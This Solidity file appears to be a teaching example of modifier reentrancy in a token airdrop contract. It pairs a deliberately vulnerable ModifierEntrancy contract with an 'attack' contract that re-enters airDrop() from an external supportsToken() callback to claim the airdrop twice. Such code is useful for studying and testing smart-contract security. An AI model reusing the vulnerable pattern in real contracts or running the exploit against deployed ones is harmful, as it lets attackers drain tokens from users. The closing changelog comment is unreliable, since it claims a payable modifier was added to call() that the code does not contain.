pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";
    Bank public bank;

    constructor(address _bank) public {
        bank = Bank(_bank);
    }

    function airDrop() public hasNoBalance supportsToken {
        tokenBalance[msg.sender] += 20;
    }

    modifier supportsToken() {
        require(
            keccak256(abi.encodePacked(name)) ==
                bank.supportsToken()
        );
        _;
    }

    modifier hasNoBalance() {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external pure returns (bytes32) {
        return (keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {
    bool hasBeenCalled;

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }

    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
} 

// Changes Made:
// 1. Added a Bank contract instance in ModifierEntrancy contract to call supportsToken function
// 2. Removed the hardcoded name and used the constant name variable instead in supportsToken modifier
// 3. Added a constructor to ModifierEntrancy contract to pass Bank contract address
// 4. Removed the unnecessary Bank contract instance creation in supportsToken modifier
// 5. Added payable modifier in the call function of attack contract to send ether while calling airDrop function.